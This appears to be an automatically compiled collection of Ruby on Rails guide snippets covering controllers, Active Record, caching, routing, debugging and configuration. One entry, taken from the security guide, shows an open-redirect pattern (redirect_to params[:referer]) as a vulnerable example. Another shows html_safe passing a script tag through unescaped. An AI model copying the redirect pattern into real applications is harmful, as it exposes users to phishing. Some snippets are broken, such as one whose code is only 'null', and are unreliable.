action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_14\n\nLANGUAGE: rb\nCODE:\n```\nclass PostsController < ApplicationController\n  before_action :set_post, only: %i[ show edit update destroy ]\n\n  # GET /posts or /posts.json\n  def index\n    @posts = Post.all\n    debugger\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Inserting middleware at specific index in Rails\nDESCRIPTION: Demonstrates inserting a custom middleware (`Magical::Unicorns`) at a specific index (0, the top) in the Rails middleware stack using `config.middleware.insert_before`.  This effectively places the new middleware at the beginning of the stack.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.insert_before 0, Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Basic Rails Controller Definition\nDESCRIPTION: This Ruby code snippet shows the basic structure of a Rails controller. The `ProductsController` inherits from `ApplicationController` and defines an `index` action, which, by default, renders the `app/views/products/index.html.erb` template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Selecting Multiple Columns in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to select multiple columns using consecutive `select` methods. This is compared with `reselect` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_111\n\nLANGUAGE: ruby\nCODE:\n```\nBook.select(:title, :isbn).select(:created_at)\n```\n\n----------------------------------------\n\nTITLE: Defining Server Configuration Options in ServerCommand (Ruby)\nDESCRIPTION: The `server_options` method within `Rails::Command::ServerCommand` constructs and returns a hash containing key configuration settings for the server instance. These options are derived from parsed command-line arguments (`options`) and application defaults. The hash includes parameters like the server adapter to use (`:server`), port (`:Port`), host (`:Host`), environment (`:environment`), PID file path (`:pid`), and development caching (`:caching`), which are subsequently passed to the `Rails::Server` (and `Rackup::Server`) initializer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  module Command\n    class ServerCommand < Base # :nodoc:\n      no_commands do\n        def server_options\n          {\n            user_supplied_options: user_supplied_options,\n            server:                options[:using],\n            log_stdout:            log_to_stdout?,\n            Port:                  port,\n            Host:                  host,\n            DoNotReverseLookup:    true,\n            config:                options[:config],\n            environment:           environment,\n            daemonize:             options[:daemon],\n            pid:                   pid,\n            caching:               options[:dev_caching],\n            restart_cmd:           restart_command,\n            early_hints:           early_hints\n          }\n        end\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Default Translation Values\nDESCRIPTION: Examples of using default values when translations are missing\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t :missing, default: \"Not here\"\nI18n.t :missing, default: [:also_missing, \"Not here\"]\n```\n\n----------------------------------------\n\nTITLE: Running after bundle with after_bundle\nDESCRIPTION: Registers a callback to be executed after the gems are bundled and binstubs are generated using `after_bundle`. Useful for adding generated files to version control.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nafter_bundle do\n  git :init\n  git add: \".\"\n  git commit: \"-a -m 'Initial commit'\"\nend\n```\n\n----------------------------------------\n\nTITLE: Low-Level Caching: Write to Cache\nDESCRIPTION: Demonstrates writing a value to the cache using `Rails.cache.write`.  A simple string is stored with the key \"greeting\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# Store a value in the cache\nRails.cache.write(\"greeting\", \"Hello, world!\")\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of last with custom order\nDESCRIPTION: SQL query for retrieving the last record with a custom ordering (by `first_name` in descending order).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.first_name DESC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Configuring Public and Private Google Cloud Storage Services (Active Storage, YAML)\nDESCRIPTION: Sets up both private and public GCS services using YAML anchors and aliases for reuse, showing how to declare bucket and credentials for each. Demonstrates use of the public: true setting to make blobs publicly accessible. Assumes proper bucket policy configuration, and distinguishes between private and public storage for different attachment access types.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\ngcs: &gcs\n  service: GCS\n  project: \"\"\n\nprivate_gcs:\n  <<: *gcs\n  credentials: <%= Rails.root.join(\"path/to/private_key.json\") %>\n  bucket: your_own_bucket-<%= Rails.env %>\n\npublic_gcs:\n  <<: *gcs\n  credentials: <%= Rails.root.join(\"path/to/public_key.json\") %>\n  bucket: your_own_bucket-<%= Rails.env %>\n  public: true\n```\n\n----------------------------------------\n\nTITLE: Customizing Blob HTML ERB Template\nDESCRIPTION: This snippet shows how to customize the HTML rendered for embedded images and attachments by editing the `_blob.html.erb` template. It checks if the blob is representable and displays either an image or a file icon. It also includes the attachment's caption or filename and size.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_8\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/active_storage/blobs/_blob.html.erb %>\n<figure class=\"attachment attachment--<%= blob.representable? ? \"preview\" : \"file\" %> attachment--<%= blob.filename.extension %>\">\n  <% if blob.representable? %>\n    <%= image_tag blob.representation(resize_to_limit: local_assigns[:in_gallery] ? [ 800, 600 ] : [ 1024, 768 ]) %>\n  <% end %>\n\n  <figcaption class=\"attachment__caption\">\n    <% if caption = blob.try(:caption) %>\n      <%= caption %>\n    <% else %>\n      <span class=\"attachment__name\"><%= blob.filename %></span>\n      <span class=\"attachment__size\"><%= number_to_human_size blob.byte_size %></span>\n    <% end %>\n  </figcaption>\n</figure>\n```\n\n----------------------------------------\n\nTITLE: Password Reset Email Template (HTML+ERB)\nDESCRIPTION: This snippet shows the content of the `reset.html.erb` view located in `app/views/passwords_mailer/`. It generates the body of the password reset email, including a link to the password reset page (`edit_password_url`) which contains the user's unique password reset token (`@user.password_reset_token`). The link is valid for 15 minutes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_3\n\nLANGUAGE: html+erb\nCODE:\n```\n# app/views/passwords_mailer/reset.html.erb\n<p>\n  You can reset your password within the next 15 minutes on\n  <%= link_to \"this password reset page\", edit_password_url(@user.password_reset_token) %>.\n</p>\n```\n\n----------------------------------------\n\nTITLE: Deleting Record with destroy in Rails\nDESCRIPTION: This snippet shows how to delete a record from the database using the `destroy` method in ActiveRecord. It first finds a record and then calls `destroy` on it, which generates a SQL `DELETE` query. It includes the database transaction.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_29\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product.destroy\n  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/\n  Product Destroy (0.4ms)  DELETE FROM \"products\" WHERE \"products\".\"id\" = 1 /*application='Store'*/\n  TRANSACTION (0.1ms)  COMMIT TRANSACTION /*application='Store'*/\n=> #<Product:0x0000000125813d48 id: 1, name: \"T-Shirt\", created_at: \"2024-11-09 22:39:38.498730000 +0000\", updated_at: \"2024-11-09 22:39:38.498730000 +0000\">\n```\n\n----------------------------------------\n\nTITLE: Displaying ActiveRecord Configurations (Bash + Ruby)\nDESCRIPTION: This Bash and Ruby code snippet demonstrates how to inspect the ActiveRecord configurations. It first sets up a configuration in `config/database.yml`, then sets a DATABASE_URL environment variable which overrides some values from the YAML config. Finally, it executes a rails runner command to output the final merged ActiveRecord configurations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_82\n\nLANGUAGE: Bash\nCODE:\n```\n$ cat config/database.yml\ndevelopment:\n  adapter: sqlite3\n  database: NOT_my_database\n  host: localhost\n\n$ echo $DATABASE_URL\npostgresql://localhost/my_database\n\n$ bin/rails runner 'puts ActiveRecord::Base.configurations.inspect'\n```\n\nLANGUAGE: Ruby\nCODE:\n```\n#<ActiveRecord::DatabaseConfigurations:0x00007fc8eab02880 @configurations=[\n  #<ActiveRecord::DatabaseConfigurations::UrlConfig:0x00007fc8eab020b0\n    @env_name=\"development\", @spec_name=\"primary\",\n    @config={\"adapter\"=>\"postgresql\", \"database\"=>\"my_database\", \"host\"=>\"localhost\"}\n    @url=\"postgresql://localhost/my_database\">\n  ]\n```\n\n----------------------------------------\n\nTITLE: Using Dev Container CLI for Rails development environment\nDESCRIPTION: Commands to set up and use a development container for Rails using the Dev Container CLI and Docker.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ npm install -g @devcontainers/cli\n$ cd rails\n$ devcontainer up --workspace-folder .\n$ devcontainer exec --workspace-folder . bash\n```\n\n----------------------------------------\n\nTITLE: First N Characters\nDESCRIPTION: This snippet demonstrates extracting the first N characters from a string using the `first` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nnull\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Support Message Serializer in Ruby\nDESCRIPTION: This code snippet demonstrates setting the message serializer to YAML. The message serializer is used by `ActiveSupport::MessageEncryptor` and `ActiveSupport::MessageVerifier` for secure data handling. Ensure YAML is a safe and appropriate serializer for your use case.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_support.message_serializer = YAML\n```\n\n----------------------------------------\n\nTITLE: Insecure Redirection in Rails Controllers\nDESCRIPTION: Shows how unvalidated redirects can be exploited when user input is directly passed to redirect_to method, potentially leading to phishing attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to params[:referer]\n```\n\n----------------------------------------\n\nTITLE: Alternative Implementation for Acts as Yaffle in Ruby on Rails\nDESCRIPTION: This code snippet provides an alternative way to implement the squawk method using send instead of write_attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nsend(\"#{self.class.yaffle_text_field}=\", string.to_squawk)\n```\n\n----------------------------------------\n\nTITLE: Disabling Connection Pooling for MemCacheStore\nDESCRIPTION: This snippet demonstrates how to disable connection pooling for the MemCacheStore by setting the `:pool` option to `false`. This is useful when connection pooling is not desired or causing issues.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :mem_cache_store, \"cache.example.com\", { pool: false }\n```\n\n----------------------------------------\n\nTITLE: Redo latest migration\nDESCRIPTION: Demonstrates how to rollback and re-run the latest migration using the `db:migrate:redo` command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_66\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate:redo STEP=3\n```\n\n----------------------------------------\n\nTITLE: Range To FS Ruby\nDESCRIPTION: The `to_fs` method for `Range` provides a string representation with an optional format argument. The `:db` format generates a SQL `BETWEEN` clause, which is used by Active Record for range values in conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_138\n\nLANGUAGE: ruby\nCODE:\n```\n(Date.today..Date.tomorrow).to_fs\n# => \"2009-10-25..2009-10-26\"\n\n(Date.today..Date.tomorrow).to_fs(:db)\n# => \"BETWEEN '2009-10-25' AND '2009-10-26'\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Validation Contexts in Ruby on Rails\nDESCRIPTION: Demonstrates using an array of symbols for multiple validation contexts. The example shows a Book class with validations that run on both :update and :ensure_title contexts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book\n  include ActiveModel::Validations\n\n  validates :title, presence: true, on: [:update, :ensure_title]\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> book = Book.new(title: nil)\nirb> book.valid?\n=> true\nirb> book.valid?(:ensure_title)\n=> false\nirb> book.errors.messages\n=> {:title=>[\"can't be blank\"]}\n```\n\n----------------------------------------\n\nTITLE: Invoking a Rails Generator with a Custom Option using Bash\nDESCRIPTION: Demonstrates how to run the custom `initializer` generator using `bin/rails generate`, passing the `theme` name and specifying the custom `--scope` option with the value 'dashboard'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate initializer theme --scope dashboard\n```\n\n----------------------------------------\n\nTITLE: Add Multiple Columns Migration (Ruby)\nDESCRIPTION: This migration adds two columns, 'part_number' (string) and 'price' (decimal), to the 'products' table using separate 'add_column' calls.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddDetailsToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_column :products, :part_number, :string\n    add_column :products, :price, :decimal\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Class Attribute Accessors with cattr_accessor\nDESCRIPTION: This Ruby code demonstrates the use of `cattr_accessor` to define class-level attributes with reader and writer methods. It initializes a class variable to `nil` and generates the corresponding class methods to access it. It also shows how to assign a default value with a block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nclass MysqlAdapter < AbstractAdapter\n  # Generates class methods to access @@emulate_booleans.\n  cattr_accessor :emulate_booleans\nend\n```\n\n----------------------------------------\n\nTITLE: Reselecting Columns in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `reselect` method to override an existing `select` statement, selecting only the `created_at` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\nBook.select(:title, :isbn).reselect(:created_at)\n```\n\n----------------------------------------\n\nTITLE: Action Cable Channel with Parameters Ruby\nDESCRIPTION: This Ruby code shows how to pass parameters from the client-side to the server-side when creating a subscription. The ChatChannel streams from a channel name derived from the 'room' parameter passed in the subscription.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_17\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\n  def subscribed\n    stream_from \"chat_#{params[:room]}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using do: Option with Debugger Statement\nDESCRIPTION: Shows how to use the 'do:' option with the debugger statement to execute commands automatically when the debugger is triggered. In this example, it executes the 'info' command to display variable information when the debugger is reached.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\n[2, 11] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n     2|   before_action :set_post, only: %i[ show edit update destroy ]\n     3|\n     4|   # GET /posts or /posts.json\n     5|   def index\n     6|     @posts = Post.all\n=>   7|     debugger(do: \"info\")\n     8|   end\n     9|\n    10|   # GET /posts/1 or /posts/1.json\n    11|   def show\n=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7\n  #1    ActionController::BasicImplicitRender#send_action(method=\"index\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg:binding.break) info\n%self = #<PostsController:0x00000000017480>\n@_action_has_layout = true\n@_action_name = \"index\"\n@_config = {}\n@_lookup_context = #<ActionView::LookupContext:0x00007fce3ad336b8 @details_key=nil, @digest_cache=...\n@_request = #<ActionDispatch::Request GET \"http://localhost:3000/posts\" for 127.0.0.1>\n@_response = #<ActionDispatch::Response:0x00007fce3ad397e8 @mon_data=#<Monitor:0x00007fce3ad396a8>...\n@_response_body = nil\n@_routes = nil\n@marked_for_same_origin_verification = true\n@posts = #<ActiveRecord::Relation [#<Post id: 2, title: \"qweqwe\", content: \"qweqwe\", created_at: \"...\n@rendered_format = nil\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Command Paths in Ruby\nDESCRIPTION: This snippet shows how to configure the paths to external commands used by Active Storage, such as `ffprobe` for video analysis. It sets the location of the `ffprobe` executable. This is useful when the commands are not in the default system path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.paths[:ffprobe] = \"/usr/local/bin/ffprobe\"\n```\n\n----------------------------------------\n\nTITLE: Rendering Plain Text\nDESCRIPTION: Demonstrates rendering plain text content with the `:plain` option. This bypasses the default layout unless `layout: true` is specified along with a `.text.erb` layout file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nrender plain: \"OK\"\n```\n\n----------------------------------------\n\nTITLE: I18n Missing Translation Behavior Examples in Rails 7.1\nDESCRIPTION: Examples demonstrating the new behavior of I18n missing translation handling in Rails 7.1 with config.i18n.raise_on_missing_translations = true, which now raises on any missing translation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# with config.i18n.raise_on_missing_translations = true\n\n# in a view or controller:\nt(\"missing.key\") # raises in 7.0, raises in 7.1\nI18n.t(\"missing.key\") # didn't raise in 7.0, raises in 7.1\n\n# anywhere:\nI18n.t(\"missing.key\") # didn't raise in 7.0, raises in 7.1\n```\n\n----------------------------------------\n\nTITLE: Configure SendGrid Ingress\nDESCRIPTION: This snippet shows the configuration required in `config/environments/production.rb` to define sendgrid as action mailbox ingress. It also shows how to store the password in credentials or environment variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :sendgrid\n```\n\n----------------------------------------\n\nTITLE: Log Out Button - ERB\nDESCRIPTION: This ERB snippet adds a \"Log out\" button to the application layout, only displayed if the user is authenticated. It sends a DELETE request to the session path which will log the user out. It depends on the `authenticated?` helper method and the `session_path` route.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_70\n\nLANGUAGE: erb\nCODE:\n```\n<%= button_to \"Log out\", session_path, method: :delete if authenticated? %>\n```\n\n----------------------------------------\n\nTITLE: Handling Empty Collections\nDESCRIPTION: This code snippet shows how to provide alternative content when rendering an empty collection using the `||` operator to render a string if `@products` is nil or empty.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_90\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Products</h1>\n<%= render(@products) || \"There are no products available.\" %>\n```\n\n----------------------------------------\n\nTITLE: Using rich_textarea in a Form\nDESCRIPTION: This ERB code uses the `rich_textarea` helper within a form to create a Trix editor for the `content` attribute of the `article` model. This enables the creation and updating of rich text content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<%# app/views/articles/_form.html.erb %>\n<%= form_with model: article do |form| %>\n  <div class=\"field\">\n    <%= form.label :content %>\n    <%= form.rich_textarea :content %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Example usage of html_safe with a script tag\nDESCRIPTION: This Ruby code shows an example of using the `html_safe` method with a script tag. It emphasizes that `html_safe` does not perform any escaping, so the script tag remains as is, even if it contains potentially malicious code. It's the developer's responsibility to ensure the string's safety.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\ns = \"<script>...</script>\".html_safe\ns.html_safe? # => true\ns            # => \"<script>...</script>\"\n```\n\n----------------------------------------\n\nTITLE: Example SQL Queries with ActiveRecord Query Log Tags\nDESCRIPTION: Shows examples of SQL queries generated by ActiveRecord when query log tags are enabled. The comments include metadata such as the application name, controller, action, or job name, aiding in debugging and tracing query origins, especially when analyzing slow query logs or monitoring database activity. The format adheres to the SQLCommenter specification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nArticle Load (0.2ms)  SELECT \"articles\".* FROM \"articles\" /*application='Blog',controller='articles',action='index'*/\n\nArticle Update (0.3ms)  UPDATE \"articles\" SET \"title\" = ?, \"updated_at\" = ? WHERE \"posts\".\"id\" = ? /*application='Blog',job='ImproveTitleJob'*/  [[\"title\", \"Improved Rails debugging guide\"], [\"updated_at\", \"2022-10-16 20:25:40.091371\"], [\"id\", 1]]\n```\n\n----------------------------------------\n\nTITLE: Conditional Variable Assignment with Hash#fetch in Rails\nDESCRIPTION: This example demonstrates how to use `Hash#fetch` with `local_assigns` to conditionally access a local variable and provide a default value if the variable is not present. In this case, if `:related_products` is not present, it defaults to an empty array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_27\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/_product.html.erb %>\n\n<% local_assigns.fetch(:related_products, []).each do |related_product| %>\n  <%# ... %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Validating a User object to trigger validation callbacks in Rails\nDESCRIPTION: This IRB snippet creates a new `User` object and then calls `valid?` on it. This triggers the `before_validation` and `after_validation` callbacks. The output shows the log messages from these callbacks, including the titleized name and the validation error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_8\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.new(name: \"\", email: \"john.doe@example.com\", password: \"abc123456\")\n=> #<User id: nil, email: \"john.doe@example.com\", created_at: nil, updated_at: nil, name: \"\">\n\nirb> user.valid?\nName titleized to \nValidation failed: Name can't be blank\n=> false\n```\n\n----------------------------------------\n\nTITLE: Configuring Structure Dump Options for PostgreSQL - Rails Initializer - Ruby\nDESCRIPTION: Sets a global option for Rails to pass additional flags (--no-comments) to pg_dump when generating PostgreSQL database structure dumps if schema_format is :sql. Should be included in a Rails initializer. Inputs are an array of pg_dump flags; output is a custom structure dump omitting comments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Tasks::DatabaseTasks.structure_dump_flags = [\\\"--no-comments\\\"]\n```\n\n----------------------------------------\n\nTITLE: Adding/Subtracting Durations from Time in Rails\nDESCRIPTION: Rails allows the addition and subtraction of Duration objects to and from Time objects.  This functionality uses `since` or `advance` internally to correctly calculate the resulting time, even across calendar reforms or time zone changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_173\n\nLANGUAGE: ruby\nCODE:\n```\nnow = Time.current\n# => Mon, 09 Aug 2010 23:20:05 UTC +00:00\nnow + 1.year\n# => Tue, 09 Aug 2011 23:21:11 UTC +00:00\nnow - 1.week\n# => Mon, 02 Aug 2010 23:21:11 UTC +00:00\n```\n\nLANGUAGE: ruby\nCODE:\n```\nTime.utc(1582, 10, 3) + 5.days\n# => Mon Oct 18 00:00:00 UTC 1582\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies on Fedora or CentOS\nDESCRIPTION: Commands to install all required dependencies including databases, Node.js, and Yarn on Fedora or CentOS systems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo dnf install sqlite-devel sqlite-libs mysql-server mysql-devel postgresql-server postgresql-devel redis memcached ImageMagick ffmpeg mupdf libxml2-devel vips poppler-utils\n\n# Install Yarn\n# Use this command if you do not have Node.js installed\n# ref: https://github.com/nodesource/distributions#installation-instructions-1\n$ sudo dnf install https://rpm.nodesource.com/pub_20/nodistro/repo/nodesource-release-nodistro-1.noarch.rpm -y\n$ sudo dnf install nodejs -y --setopt=nodesource-nodejs.module_hotfixes=1\n\n# Once you have installed Node.js, install the yarn npm package\n$ sudo npm install --global yarn\n```\n\n----------------------------------------\n\nTITLE: JavaScript Include Tag (Rails/ERB)\nDESCRIPTION: This example demonstrates how to include a JavaScript file named `main.js` in a Rails view using the `javascript_include_tag` helper. The file is expected to be in one of the assets directories.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_42\n\nLANGUAGE: erb\nCODE:\n```\n<%= javascript_include_tag \"main\" %>\n```\n\n----------------------------------------\n\nTITLE: Translation with Interpolation\nDESCRIPTION: Shows how to handle nested interpolation in translations with deep_interpolation parameter\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_34\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  welcome:\n    title: \"Welcome!\"\n    content: \"Welcome to the %{app_name}\"\n```\n\n----------------------------------------\n\nTITLE: Setting Method Breakpoints in Rails Debugger\nDESCRIPTION: Using the `break` command to set a breakpoint on a method call. This example demonstrates setting a breakpoint on `@post.save` and the debugger stopping execution when that method is called.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\n[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n    20|   end\n    21|\n    22|   # POST /posts or /posts.json\n    23|   def create\n    24|     @post = Post.new(post_params)\n=>  25|     debugger\n    26|\n    27|     respond_to do |format|\n    28|       if @post.save\n    29|         format.html { redirect_to @post, notice: \"Post was successfully created.\" }\n=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25\n  #1    ActionController::BasicImplicitRender#send_action(method=\"create\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg) b @post.save    # break command\n#0  BP - Method  @post.save at /Users/st0012/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:43\n```\n\nLANGUAGE: ruby\nCODE:\n```\n(rdbg) c    # continue command\n[39, 48] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb\n    39|         SuppressorRegistry.suppressed[name] = previous_state\n    40|       end\n    41|     end\n    42|\n    43|     def save(**) # :nodoc:\n=>  44|       SuppressorRegistry.suppressed[self.class.name] ? true : super\n    45|     end\n    46|\n    47|     def save!(**) # :nodoc:\n    48|       SuppressorRegistry.suppressed[self.class.name] ? true : super\n=>#0    ActiveRecord::Suppressor#save(#arg_rest=nil) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:44\n  #1    block {|format=#<ActionController::MimeResponds::Collec...|} in create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:28\n  # and 75 frames (use `bt' command for all frames)\n\nStop by #0  BP - Method  @post.save at /Users/st0012/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:43\n```\n\n----------------------------------------\n\nTITLE: Configuring Exim Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from an SMTP relay using the Exim ingress. This setting should be placed within the application's production environment configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :relay\n```\n\n----------------------------------------\n\nTITLE: Redirection (Ruby)\nDESCRIPTION: Redirects requests from one path to another using the `redirect` helper. Default redirection is a 301 \"Moved Permanently\" redirect.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/stories\", to: redirect(\"/articles\")\n```\n\n----------------------------------------\n\nTITLE: Renaming Default Route Parameter 'id' in Rails\nDESCRIPTION: Shows how to rename the default route parameter `id` using the `:param` option in `resources`. This allows you to use a different parameter name, such as `identifier`, in your routes and controllers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\nresources :videos, param: :identifier\n```\n\n----------------------------------------\n\nTITLE: Prefixing Named Route Helpers in Rails\nDESCRIPTION: Shows how to prefix route helpers when using a scope, preventing name collisions. The example prefixes the `photos` resource within the `/admin` scope with `admin_photos`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\nscope \"admin\" do\n  resources :photos, as: \"admin_photos\"\nend\n\nresources :photos\n```\n\n----------------------------------------\n\nTITLE: Using form_for with RESTful resources in Rails ERB 